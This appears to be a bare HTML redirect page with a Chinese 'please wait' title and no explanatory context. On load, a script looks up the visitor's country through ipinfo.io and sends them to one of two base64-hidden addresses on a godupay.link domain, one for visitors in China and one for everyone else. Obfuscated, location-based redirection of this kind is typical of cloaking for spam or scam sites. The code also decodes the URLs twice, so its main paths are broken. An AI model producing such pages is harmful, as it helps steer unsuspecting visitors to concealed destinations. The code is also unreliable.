
<!DOCTYPE html>
<html>
<head>
  <title>正在跳转请稍后....</title>
	
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-145418913-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-145418913-1');
</script>

  <script>
    function redirectToPage() {
      const redirectUrlChina = atob('aHR0cHM6Ly9taS5nb2R1cGF5LmxpbmsvJUU5JUE2JTk2JUU5JUExJUI1'); // Base64 解码
      const redirectUrlOther = atob('aHR0cHM6Ly84OS5xcS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
      fetch('https://ipinfo.io/json')
        .then(response => {
          if (!response.ok) {
            throw new Error('访问IP信息API失败');
          }
          return response.json();
        })
        .then(data => {
          const { country } = data;
          if (country === 'CN') {
            window.location.href = atob(redirectUrlChina); // Base64 解码
          } else {
            window.location.href = atob(redirectUrlOther); // Base64 解码
          }
        })
        .catch(error => {
          console.error(error);
          window.location.href = atob('aHR0cHM6Ly84OS5xcS5nb2R1cGF5Lmxpbmsv'); // Base64 解码
        });
    }
  </script>
</head>
<body onload="redirectToPage()">
  <h1>正在跳转请稍后......</h1>
</body>
</html>
